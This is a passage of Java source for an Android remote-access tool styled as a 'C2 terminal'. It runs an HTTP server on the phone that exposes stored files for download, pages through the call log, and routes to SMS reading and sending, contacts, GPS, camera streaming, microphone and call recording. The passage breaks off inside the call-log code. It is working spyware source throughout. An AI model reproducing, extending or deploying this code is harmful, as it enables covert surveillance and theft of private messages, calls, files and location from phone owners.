package com.labs.k4n3co;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;
import java.util.HashSet;
import java.util.Set;
import java.util.HashMap;
import java.util.Date;

import java.io.File;
import java.io.FileInputStream;
import java.io.ByteArrayOutputStream;
import java.text.SimpleDateFormat;
import java.util.Locale;
import java.util.Map;

import fi.iki.elonen.NanoHTTPD;

public class K4N3COHttpServer extends NanoHTTPD {

    private final Context context;

    private static final String HTML_HEADER = "<!DOCTYPE html>" +
            "<html lang=\"en\">" +
            "<head>" +
            "<meta charset=\"UTF-8\">" +
            "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">" +
            "<title>LAB-RATS | C2 TERMINAL</title>" +
            "<link href=\"https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700&display=swap\" rel=\"stylesheet\">" +
            "<style>" +
            ":root {" +
            "  --neon-cyan: #00f2ff;" +
            "  --neon-magenta: #00f2ff;" +
            "  --neon-green: #39ff14;" +
            "  --bg-dark: #050505;" +
            "  --bg-card: rgba(15, 15, 25, 0.8);" +
            "  --terminal-green: #00ff41;" +
            "  --danger: #ff3131;" +
            "}" +
            "* { margin: 0; padding: 0; box-sizing: border-box; cursor: url(\"data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='32' height='32' style='font-size: 24px;'><text y='20'>🐀</text></svg>\"), auto; }" +
            "body {" +
            "  font-family: 'JetBrains Mono', monospace;" +
            "  background: var(--bg-dark);" +
            "  background-image: " +
            "    radial-gradient(circle at 50% 50%, rgba(0, 242, 255, 0.05) 0%, transparent 50%)," +
            "    linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%)," +
            "    linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));" +
            "  background-size: 100% 100%, 100% 4px, 3px 100%;" +
            "  min-height: 100vh;" +
            "  color: #e0e0e0;" +
            "  overflow-x: hidden;" +
            "}" +
            "body::before {" +
            "  content: \" \";" +
            "  display: block;" +
            "  position: fixed;" +
            "  top: 0; left: 0; bottom: 0; right: 0;" +
            "  background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));" +
            "  z-index: 9999;" +
            "  pointer-events: none;" +
            "  background-size: 100% 2px, 3px 100%;" +
            "}" +
            ".container { max-width: 1200px; margin: 0 auto; padding: 20px; position: relative; z-index: 1; }" +
            ".header {" +
            "  text-align: center;" +
            "  padding: 40px 0;" +
            "  border-bottom: 1px solid var(--neon-cyan);" +
            "  margin-bottom: 30px;" +
            "  box-shadow: 0 0 20px rgba(0, 242, 255, 0.2);" +
            "  position: relative;" +
            "  overflow: hidden;" +
            "}" +
            ".header h1 {" +
            "  font-family: 'Orbitron', sans-serif;" +
            "  font-size: 3rem;" +
            "  color: var(--neon-cyan);" +
            "  text-transform: uppercase;" +
            "  letter-spacing: 8px;" +
            "  margin-right: -8px;" +
            "  text-shadow: 0 0 10px var(--neon-cyan), 0 0 20px var(--neon-cyan);" +
            "  margin-bottom: 10px;" +
            "  animation: glitch 1s infinite alternate;" +
            "}" +
            "@keyframes glitch {" +
            "  0% { transform: skew(0deg); }" +
            "  20% { transform: skew(-1deg); text-shadow: 2px 0 var(--neon-cyan); }" +
            "  40% { transform: skew(1deg); text-shadow: -2px 0 var(--neon-cyan); }" +
            "  100% { transform: skew(0deg); }" +
            "}" +
            "@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }" +
            ".nav { display: flex; gap: 15px; flex-wrap: wrap; justify-content: center; margin-bottom: 40px; }" +
            ".nav a {" +
            "  padding: 12px 25px;" +
            "  background: transparent;" +
            "  border: 1px solid var(--neon-cyan);" +
            "  color: var(--neon-cyan);" +
            "  text-decoration: none;" +
            "  text-transform: uppercase;" +
            "  font-size: 0.8rem;" +
            "  letter-spacing: 2px;" +
            "  transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);" +
            "  position: relative;" +
            "  overflow: hidden;" +
            "}" +
            ".nav a:hover {" +
            "  background: var(--neon-cyan);" +
            "  color: var(--bg-dark);" +
            "  box-shadow: 0 0 30px var(--neon-cyan);" +
            "}" +
            ".card {" +
            "  background: var(--bg-card);" +
            "  border-left: 4px solid var(--neon-magenta);" +
            "  border-radius: 4px;" +
            "  padding: 30px;" +
            "  margin-bottom: 25px;" +
            "  border-right: 1px solid rgba(255, 0, 255, 0.1);" +
            "  border-top: 1px solid rgba(255, 0, 255, 0.1);" +
            "  border-bottom: 1px solid rgba(255, 0, 255, 0.1);" +
            "  backdrop-filter: blur(15px);" +
            "  box-shadow: 10px 10px 20px rgba(0,0,0,0.5);" +
            "  position: relative;" +
            "}" +
            ".card::after {" +
            "  content: \"SYS_READY\";" +
            "  position: absolute;" +
            "  top: 10px; right: 15px;" +
            "  font-size: 0.6rem;" +
            "  color: var(--neon-magenta);" +
            "  opacity: 0.5;" +
            "}" +
            "h2, h3 { font-family: 'Orbitron', sans-serif; text-transform: uppercase; letter-spacing: 3px; margin-bottom: 20px; color: var(--neon-cyan); }" +
            "table { width: 100%; border-collapse: separate; border-spacing: 0 8px; margin-top: 15px; }" +
            "th { background: rgba(0, 242, 255, 0.1); color: var(--neon-cyan); text-transform: uppercase; font-size: 0.75rem; letter-spacing: 2px; padding: 15px; text-align: left; border-bottom: 2px solid var(--neon-cyan); }" +
            "td { background: rgba(255,255,255,0.02); padding: 15px; font-size: 0.85rem; border-top: 1px solid rgba(255,255,255,0.05); border-bottom: 1px solid rgba(255,255,255,0.05); }" +
            "tr:hover td { background: rgba(0, 242, 255, 0.05); color: var(--neon-cyan); }" +
            ".file-item { display: flex; align-items: center; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05); border-left: 3px solid var(--neon-cyan); margin: 10px 0; padding: 12px 15px; transition: all 0.3s; gap: 15px; }" +
            ".file-item:hover { transform: translateX(10px); background: rgba(0, 242, 255, 0.05); border-color: var(--neon-cyan); }" +
            ".info-item { background: rgba(0,0,0,0.3); border: 1px solid rgba(0, 242, 255, 0.1); padding: 15px; }" +
            ".info-label { color: var(--neon-cyan); opacity: 0.7; font-size: 0.7rem; text-transform: uppercase; }" +
            ".info-value { color: var(--neon-green); font-family: 'JetBrains Mono', monospace; }" +
            "button, .btn {" +
            "  display: inline-block;" +
            "  background: transparent;" +
            "  border: 1px solid var(--neon-green);" +
            "  color: var(--neon-green);" +
            "  padding: 10px 20px;" +
            "  text-transform: uppercase;" +
            "  letter-spacing: 2px;" +
            "  text-decoration: none;" +
            "  transition: all 0.3s;" +
            "  box-shadow: inset 0 0 0 0 var(--neon-green);" +
            "}" +
            "button:hover, .btn:hover { background: var(--neon-green); color: var(--bg-dark); box-shadow: 0 0 20px var(--neon-green); }" +
            ".btn-small { padding: 6px 12px; font-size: 0.7rem; min-width: 80px; text-align: center; white-space: nowrap; }" +
            ".empty-state { text-align: center; padding: 40px 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; }" +
            ".empty-state .icon { color: var(--danger); text-shadow: 0 0 10px var(--danger); font-size: 3rem; margin-bottom: 20px; }" +
            ".empty-state h2 { margin-bottom: 10px; }" +
            ".empty-state p { opacity: 0.7; margin-bottom: 25px; }" +
            ".glitch-text {" +
            "  color: var(--neon-cyan);" +
            "  font-size: 0.6rem;" +
            "  letter-spacing: 3px;" +
            "  margin-right: -3px;" +
            "  text-transform: uppercase;" +
            "  margin-top: 5px;" +
            "  position: relative;" +
            "  animation: subtle-glow 4s ease-in-out infinite;" +
            "}" +
            "@keyframes subtle-glow {" +
            "  0%, 100% { opacity: 0.6; text-shadow: 0 0 2px var(--neon-cyan); }" +
            "  50% { opacity: 1; text-shadow: 0 0 8px var(--neon-cyan); }" +
            "}" +
            "@media (max-width: 768px) {" +
            "  .header h1 { font-size: 1.8rem; letter-spacing: 4px; }" +
            "  .nav a { padding: 8px 12px; font-size: 0.7rem; }" +
            "}" +
            ".contact-avatar {" +
            "  width: 40px; height: 40px;" +
            "  border-radius: 50%;" +
            "  background: linear-gradient(135deg, var(--neon-magenta), var(--neon-cyan));" +
            "  display: flex; align-items: center; justify-content: center;" +
            "  font-weight: bold; margin-right: 15px;" +
            "  color: var(--bg-dark);" +
            "  box-shadow: 0 0 10px rgba(255, 0, 255, 0.5);" +
            "}" +
            ".call-incoming { color: var(--neon-green); }" +
            ".call-outgoing { color: var(--neon-cyan); }" +
            ".call-missed { color: var(--danger); }" +
            ".file-icon { width: 45px; height: 45px; min-width: 45px; border-radius: 4px; display: flex; align-items: center; justify-content: center; font-size: 1.2rem; }" +
            ".folder-icon { background: rgba(243, 156, 18, 0.2); border: 1px solid #f39c12; color: #f39c12; }" +
            ".file-icon-default { background: rgba(52, 152, 219, 0.2); border: 1px solid #3498db; color: #3498db; }" +
            ".pagination { display: flex; justify-content: center; gap: 10px; margin-top: 25px; }" +
            ".pagination a { padding: 8px 16px; background: var(--bg-card); border: 1px solid var(--neon-cyan); color: var(--neon-cyan); text-decoration: none; }" +
            ".pagination .active { background: var(--neon-cyan); color: var(--bg-dark); }" +
            ".breadcrumb { display: flex; align-items: center; background: rgba(0,0,0,0.4); padding: 10px 20px; border-radius: 4px; margin-bottom: 20px; border: 1px solid rgba(0, 242, 255, 0.2); font-size: 0.8rem; overflow-x: auto; white-space: nowrap; }" +
            ".breadcrumb a { color: var(--neon-cyan); text-decoration: none; padding: 2px 8px; border-radius: 3px; transition: background 0.2s; }" +
            ".breadcrumb a:hover { background: rgba(0, 242, 255, 0.1); }" +
            ".breadcrumb span { color: var(--neon-magenta); margin: 0 5px; font-weight: bold; }" +
            ".file-list { list-style: none; display: grid; grid-template-columns: 1fr; gap: 10px; }" +
            ".file-info { display: flex; flex-direction: column; flex: 1; min-width: 0; }" +
            ".file-name { color: #fff; text-decoration: none; font-weight: bold; font-size: 0.95rem; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; margin-bottom: 2px; }" +
            ".file-name:hover { color: var(--neon-cyan); text-shadow: 0 0 5px var(--neon-cyan); }" +
            ".file-meta { font-size: 0.7rem; color: #888; font-family: 'JetBrains Mono', monospace; letter-spacing: 1px; }" +
            ".file-icon-image { background: rgba(155, 89, 182, 0.2); border: 1px solid #9b59b6; color: #9b59b6; }" +
            ".file-icon-video { background: rgba(231, 76, 60, 0.2); border: 1px solid #e74c3c; color: #e74c3c; }" +
            ".file-icon-audio { background: rgba(26, 188, 156, 0.2); border: 1px solid #1abc9c; color: #1abc9c; }" +
            ".file-icon-doc { background: rgba(46, 204, 113, 0.2); border: 1px solid #2ecc71; color: #2ecc71; }" +
            ".watermark {" +
            "  position: absolute;" +
            "  top: 0;" +
            "  left: 0;" +
            "  width: 242px;" +
            "  height: 182px;" +
            "  background: url('/logo') no-repeat left center;" +
            "  background-size: contain;" +
            "  opacity: 0.10;" +
            "  z-index: 0;" +
            "  pointer-events: none;" +
            "  filter: grayscale(100%) brightness(200%);" +
            "}" +
            "</style>" +
            "</head>" +
            "<body>" +
            "<div class=\"container\">" +
            "<div class=\"header\">" +
            "<div class=\"watermark\"></div>" +
            "<h1>LAB-RATS</h1>" +
            "<p style=\"color: var(--neon-cyan); font-size: 0.7rem; opacity: 0.6; letter-spacing: 5px; margin-right: -5px;\">REMOTE ACCESS TERMINAL V2.0.1</p>" +
            "<div class=\"glitch-text\">Developed by K4N3CO.LABS</div>" +
            "</div>" +
            "<div class=\"nav\">" +
            "<a href=\"/\">Terminal</a>" +
            "<a href=\"/device\">Hardware</a>" +
            "<a href=\"/camera\">Optics</a>" +
            "<a href=\"/audio\">Acoustics</a>" +
            "<a href=\"/files\">Data</a>" +
            "<a href=\"/calls\">Comms</a>" +
            "<a href=\"/sms\">SMS</a>" +
            "<a href=\"/mms\">MMS</a>" +
            "<a href=\"/contacts\">Contacts</a>" +
            "</div>";

    private static final String HTML_FOOTER = "</div>" +
            "</body>" +
            "</html>";

    public K4N3COHttpServer(Context context, int port) {
        super(port);
        this.context = context;
    }

    @Override
    public Response serve(IHTTPSession session) {
        String uri = session.getUri();
        Map<String, String> params = session.getParms();

        try {
            if (uri.equals("/") || uri.isEmpty()) {
                return serveHome();
            } else if (uri.equals("/logo")) {
                return serveLogo();
            } else if (uri.equals("/device")) {
                return serveDeviceInfo();
            } else if (uri.equals("/files") || uri.startsWith("/files/")) {
                return serveFiles(uri, params);
            } else if (uri.equals("/calls")) {
                return serveCallLogs(params);
            } else if (uri.equals("/sms")) {
                return serveSmsMessages(params);
            } else if (uri.equals("/mms")) {
                return serveMmsMessages(params);
            } else if (uri.startsWith("/mms/image/")) {
                return serveMmsImage(uri.substring(11));
            } else if (uri.equals("/sms/send")) {
                return sendSms(params);
            } else if (uri.equals("/contacts")) {
                return serveContacts(params);
            } else if (uri.equals("/camera")) {
                return serveCameraPage();
            } else if (uri.equals("/camera/capture")) {
                return serveCameraCapture(params);
            } else if (uri.equals("/camera/photo")) {
                return serveCameraPhoto(params);
            } else if (uri.equals("/camera/live")) {
                return serveLiveStreamPage(params);
            } else if (uri.equals("/camera/stream")) {
                return serveMJPEGStream(params);
            } else if (uri.equals("/camera/frame")) {
                return serveSingleFrame();
            } else if (uri.equals("/camera/start-stream")) {
                return startCameraStream(params);
            } else if (uri.equals("/camera/stop-stream")) {
                return stopCameraStream();
            } else if (uri.equals("/camera/record")) {
                return startVideoRecording(params);
            } else if (uri.equals("/camera/stop-record")) {
                return stopVideoRecording();
            } else if (uri.equals("/camera/status")) {
                return serveCameraStatus();
            } else if (uri.equals("/camera/flash")) {
                return triggerFlash();
            } else if (uri.equals("/gps")) {
                return serveGpsPage();
            } else if (uri.equals("/gps/locate")) {
                return serveGpsLocate();
            } else if (uri.startsWith("/download/")) {
                return serveDownload(uri);
            } else if (uri.equals("/audio")) {
                return serveAudioPage();
            } else if (uri.equals("/audio/mic/start")) {
                return startMicRecording(params);
            } else if (uri.equals("/audio/mic/stop")) {
                return stopMicRecording();
            } else if (uri.equals("/audio/call/start")) {
                return startCallRecording(params);
            } else if (uri.equals("/audio/call/stop")) {
                return stopCallRecording();
            } else if (uri.equals("/audio/status")) {
                return serveAudioStatus();
            } else if (uri.equals("/audio/settings")) {
                return updateAudioSettings(params);
            } else if (uri.equals("/audio/recordings")) {
                return serveAudioRecordings();
            } else {
                return serve404();
            }
        } catch (Exception e) {
            return serveError(e.getMessage());
        }
    }

    private Response serveLogo() {
        try {
            java.io.InputStream is = context.getResources().openRawResource(R.drawable.app_logo);
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            int nRead;
            byte[] data = new byte[16384];
            while ((nRead = is.read(data, 0, data.length)) != -1) {
                buffer.write(data, 0, nRead);
            }
            byte[] bytes = buffer.toByteArray();
            Response response = newFixedLengthResponse(Response.Status.OK, "image/png", new java.io.ByteArrayInputStream(bytes), bytes.length);
            response.addHeader("Cache-Control", "public, max-age=31536000"); // Cache for 1 year
            return response;
        } catch (Exception e) {
            return serveError("Logo error: " + e.getMessage());
        }
    }

    private Response serveHome() {
        String ip = MainActivity.getLocalIpAddress();
        String ipDisplay = (ip != null ? ip : "NOT_DETECTED");

        StringBuilder html = new StringBuilder(HTML_HEADER);
        
        // Status Monitor Card
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 25px;\">SYSTEM_MONITOR v4.0</h2>");
        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px;\">");
        
        // Server Status
        html.append("<div style=\"padding: 20px; background: rgba(57, 255, 20, 0.05); border: 1px solid var(--neon-green); border-left-width: 5px; box-shadow: 0 0 10px rgba(57, 255, 20, 0.1);\">");
        html.append("<div class=\"info-label\">UPLINK_STATUS</div>");
        html.append("<div style=\"font-size: 1.5rem; font-weight: bold; color: var(--neon-green); text-shadow: 0 0 5px var(--neon-green);\">ONLINE</div>");
        html.append("</div>");
        
        // Port
        html.append("<div style=\"padding: 20px; background: rgba(0, 242, 255, 0.05); border: 1px solid var(--neon-cyan); border-left-width: 5px; box-shadow: 0 0 10px rgba(0, 242, 255, 0.1);\">");
        html.append("<div class=\"info-label\">ACCESS_PORT</div>");
        html.append("<div style=\"font-size: 1.5rem; font-weight: bold; color: var(--neon-cyan); text-shadow: 0 0 5px var(--neon-cyan);\">8080</div>");
        html.append("</div>");
        
        // IP
        html.append("<div style=\"padding: 20px; background: rgba(255, 0, 255, 0.05); border: 1px solid var(--neon-magenta); border-left-width: 5px; box-shadow: 0 0 10px rgba(255, 0, 255, 0.1);\">");
        html.append("<div class=\"info-label\">VIRTUAL_ADDRESS</div>");
        html.append("<div style=\"font-size: 1rem; font-weight: bold; color: var(--neon-magenta); word-break: break-all;\">").append(ipDisplay).append("</div>");
        html.append("</div>");
        
        html.append("</div>");
        html.append("</div>");

        // Quick Access Terminal
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 25px;\">QUICK_ACCESS_NODES</h2>");
        html.append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr)); gap: 15px;\">");

        // Node definitions
        String[][] nodes = {
            {"/device", "Hardware", "&#128241;", "var(--neon-cyan)"},
            {"/files", "Data", "&#128193;", "var(--neon-green)"},
            {"/camera", "Optics", "&#128247;", "var(--neon-green)"},
            {"/gps", "Locate", "&#128205;", "var(--danger)"},
            {"/calls", "Comms", "&#128222;", "#ffff00"},
            {"/sms", "SMS", "&#128233;", "var(--neon-cyan)"},
            {"/mms", "MMS", "&#128444;", "var(--neon-magenta)"},
            {"/audio", "Acoustics", "&#127908;", "#1abc9c"},
            {"/contacts", "Contacts", "&#128101;", "#f39c12"}
        };

        for (String[] node : nodes) {
            html.append("<a href=\"").append(node[0]).append("\" style=\"padding: 25px 15px; background: rgba(255,255,255,0.02); border-radius: 4px; text-decoration: none; text-align: center; border: 1px solid ").append(node[3]).append("; opacity: 0.8; transition: all 0.3s;\">");
            html.append("<div style=\"font-size: 2.2rem; margin-bottom: 15px; filter: drop-shadow(0 0 5px ").append(node[3]).append(");\">").append(node[2]).append("</div>");
            html.append("<div style=\"color: ").append(node[3]).append("; font-weight: 600; font-size: 0.8rem; letter-spacing: 2px; text-transform: uppercase;\">").append(node[1]).append("</div>");
            html.append("</a>");
        }

        html.append("</div>");
        html.append("</div>");
        
        // System Log Preview (Cyber effect)
        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">");
        html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7;\">SESSION_LOGS</h3>");
        html.append("<div style=\"background: #000; padding: 15px; border-radius: 4px; font-size: 0.75rem; color: var(--terminal-green); line-height: 1.6; font-family: 'JetBrains Mono', monospace;\">");
        html.append("<div>[SUCCESS] Uplink established at ").append(new java.util.Date()).append("</div>");
        html.append("<div>[INFO] Device model: ").append(android.os.Build.MODEL).append(" detected</div>");
        html.append("<div>[INFO] Encrypted bridge active... waiting for command</div>");
        html.append("</div>");
        html.append("</div>");

        html.append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveDeviceInfo() {
        String html = HTML_HEADER +
                "<div class=\"card\">" +
                "<h2 style=\"margin-bottom: 20px;\">Device Information</h2>" +
                DeviceInfo.getDeviceInfoHtml(context) +
                "</div>" +
                HTML_FOOTER;

        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
    }

    private Response serveFiles(String uri, Map<String, String> params) {
        String path = uri.equals("/files") ? "" : uri.substring(7);
        path = path.replace("%20", " ");

        File baseDir = Environment.getExternalStorageDirectory();
        File currentDir = new File(baseDir, path);

        if (!currentDir.exists()) {
            return serve404();
        }

        if (currentDir.isFile()) {
            return serveFileDownload(currentDir);
        }

        StringBuilder html = new StringBuilder(HTML_HEADER);

        // Breadcrumb Trail
        html.append("<div class=\"breadcrumb\">");
        html.append("<span style=\"color: var(--neon-green); margin-right: 10px;\">root@K4N3CO:~$</span>");
        html.append("<a href=\"/files\">storage</a>");

        if (!path.isEmpty()) {
            String[] parts = path.split("/");
            StringBuilder pathBuilder = new StringBuilder();
            for (String part : parts) {
                if (!part.isEmpty()) {
                    pathBuilder.append("/").append(part);
                    html.append("<span>/</span>");
                    html.append("<a href=\"/files").append(pathBuilder).append("\">").append(part.toLowerCase()).append("</a>");
                }
            }
        }
        html.append("<span style=\"margin-left: 10px; color: var(--neon-cyan); animation: blink 1s infinite;\">_</span>");
        html.append("</div>");

        html.append("<div class=\"card\">");
        html.append("<div style=\"display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; border-bottom: 1px solid rgba(0, 242, 255, 0.1); padding-bottom: 15px;\">");
        html.append("<h2 style=\"margin-bottom: 0; font-size: 1.2rem;\">")
            .append(path.isEmpty() ? "SYSTEM_STORAGE" : "DIR: " + currentDir.getName().toUpperCase())
            .append("</h2>");
        html.append("<span style=\"font-size: 0.7rem; color: var(--neon-green); opacity: 0.8;\">MODE: SECURE_ACCESS</span>");
        html.append("</div>");

        File[] files = currentDir.listFiles();
        if (files != null && files.length > 0) {
            html.append("<ul class=\"file-list\">");

            // Sort: folders first, then files
            java.util.Arrays.sort(files, (a, b) -> {
                if (a.isDirectory() && !b.isDirectory())
                    return -1;
                if (!a.isDirectory() && b.isDirectory())
                    return 1;
                return a.getName().compareToIgnoreCase(b.getName());
            });

            for (File file : files) {
                String fileName = file.getName();
                String filePath = path.isEmpty() ? fileName : path + "/" + fileName;
                String icon = getFileIcon(file);
                String iconClass = getFileIconClass(file);

                html.append("<li class=\"file-item\">");
                html.append("<div class=\"file-icon ").append(iconClass).append("\">").append(icon).append("</div>");
                html.append("<div class=\"file-info\">");
                html.append("<a class=\"file-name\" href=\"/files/").append(filePath).append("\">").append(fileName).append("</a>");
                
                html.append("<div class=\"file-meta\">");
                if (file.isDirectory()) {
                    File[] subFiles = file.listFiles();
                    int count = subFiles != null ? subFiles.length : 0;
                    html.append("<span style=\"color: #f39c12;\">DIRECTORY</span> &nbsp;|&nbsp; ").append(count).append(" OBJECTS");
                } else {
                    String ext = "";
                    int i = fileName.lastIndexOf('.');
                    if (i > 0) ext = fileName.substring(i+1).toUpperCase();
                    html.append("<span style=\"color: var(--neon-cyan);\">").append(ext.isEmpty() ? "FILE" : ext).append("</span> &nbsp;|&nbsp; ");
                    html.append(formatFileSize(file.length())).append(" &nbsp;|&nbsp; ");
                    html.append(new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault()).format(new Date(file.lastModified())));
                }
                html.append("</div></div>");

                if (file.isFile()) {
                    html.append("<a class=\"btn btn-small\" href=\"/download/").append(filePath)
                            .append("\">FETCH</a>");
                }

                html.append("</li>");
            }
            html.append("</ul>");
        } else {
            html.append(
                    "<div class=\"empty-state\"><div class=\"icon\">&#128237;</div><p>This folder is empty</p></div>");
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveFileDownload(File file) {
        try {
            FileInputStream fis = new FileInputStream(file);
            String mimeType = getMimeType(file.getName());
            Response response = newFixedLengthResponse(Response.Status.OK, mimeType, fis, file.length());
            response.addHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
            return response;
        } catch (Exception e) {
            return serveError("Cannot read file: " + e.getMessage());
        }
    }

    private Response serveDownload(String uri) {
        String path = uri.substring(10);
        path = path.replace("%20", " ");
        File baseDir = Environment.getExternalStorageDirectory();
        File file = new File(baseDir, path);

        if (!file.exists() || !file.isFile()) {
            return serve404();
        }

        return serveFileDownload(file);
    }

    private Response serveCallLogs(Map<String, String> params) {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">Recent Call Logs</h2>");

        // Check permission first
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Call log permission not granted.</p>");
                html.append(
                        "<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant the permission in the app settings.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // Pagination
        int page = 1;
        int limit = 50;
        try {
            if (params.containsKey("page")) {
                page = Integer.parseInt(params.get("page"));
                if (page < 1)
                    page = 1;
            }
        } catch (Exception e) {
            page = 1;
        }
        int offset = (page - 1) * limit;

        Cursor cursor = null;
        try {
            // Query for call logs - compatible with Android 13+
            String[] projection = new String[] {
                    CallLog.Calls._ID,
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
            };

            String sortOrder = CallLog.Calls.DATE + " DESC";

            cursor = context.getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    projection,
                    null,
                    null,
                    sortOrder);

            if (cursor != null && cursor.getCount() > 0) {
                int totalCount = cursor.getCount();
                int totalPages = (int) Math.ceil((double) totalCount / limit);

                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount)
                        .append(" calls | Page ").append(page).append(" of ").append(totalPages).append("</p>");

                html.append("<div style=\"overflow-x: auto;\">");
                html.append("<table>");
                html.append("<thead><tr>");
                html.append("<th>Type</th><th>Contact</th><th>Number</th><th>Date</th><th>Duration</th>");
                html.append("</tr></thead><tbody>");

                int count = 0;
                int skipped = 0;

                while (cursor.moveToNext()) {
                    // Skip to offset
                    if (skipped < offset) {
                        skipped++;
                        continue;
                    }

                    // Limit results
                    if (count >= limit)
                        break;

                    int idIdx = cursor.getColumnIndex(CallLog.Calls._ID);
                    int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                    int nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                    int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
                    int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
                    int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);

                    String number = numberIdx >= 0 ? cursor.getString(numberIdx) : "Unknown";
                    String name = nameIdx >= 0 ? cursor.getString(nameIdx) : null;
                    int type = typeIdx >= 0 ? cursor.getInt(typeIdx) : 0;
                    long date = dateIdx >= 0 ? cursor.getLong(dateIdx) : 0;
                    int duration = durationIdx >= 0 ? cursor.getInt(durationIdx) : 0;

                    String typeIcon, typeClass;
                    switch (type) {
                        case CallLog.Calls.INCOMING_TYPE:
                            typeIcon = "&#8595; In";
                            typeClass = "call-incoming";
                            break;
                        case CallLog.Calls.OUTGOING_TYPE:
                            typeIcon = "&#8593; Out";
                            typeClass = "call-outgoing";
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            typeIcon = "&#10006; Missed";
                            typeClass = "call-missed";
                            break;
                        case CallLog.Calls.REJECTED_TYPE:
                            typeIcon = "&#10006; Rejected";
                            typeClass = "call-missed";
                            break;
                        case CallLog.Calls.BLOCKED_TYPE:
                            typeIcon = "&#128683; Blocked";
                            typeClass = "call-missed";
                            break;
                        default:
                            typeIcon = "&#128222; Other";
                            typeClass = "";
                    }

                    html.append("<tr>");
                    html.append("<td class=\"").append(typeClass).append("\">").append(typeIcon).append("</td>");
                    html.append("<td>").append(name != null && !name.isEmpty() ? escapeHtml(name) : "-")
                            .append("</td>");
                    html.append("<td>").append(number != null ? escapeHtml(number) : "Unknown").append("</td>");
                    html.append("<td>").append(
                            new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault()).format(new Date(date)))
                            .append("</td>");
                    html.append("<td>").append(formatDuration(duration)).append("</td>");
                    html.append("</tr>");

                    count++;
                }

                html.append("</tbody></table>");
                html.append("</div>");

                // Pagination links
                if (totalPages > 1) {
                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");

                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
                    if (page > 1) {
                        html.append("<a href=\"/calls?page=1\">First</a>");
                        html.append("<a href=\"/calls?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }

                    int startPage = Math.max(1, page - 2);
                    int endPage = Math.min(totalPages, page + 2);

                    for (int i = startPage; i <= endPage; i++) {
                        String active = (i == page) ? "class=\"active\"" : "";
                        html.append("<a ").append(active).append(" href=\"/calls?page=").append(i).append("\">").append(i).append("</a>");
                    }

                    if (page < totalPages) {
                        html.append("<a href=\"/calls?page=").append(page + 1).append("\">Next &#8594;</a>");
                        html.append("<a href=\"/calls?page=").append(totalPages).append("\">Last</a>");
                    }
                    html.append("</div>");

                    // Jump to page box
                    html.append("<form action=\"/calls\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 4px; text-align: center;\">");
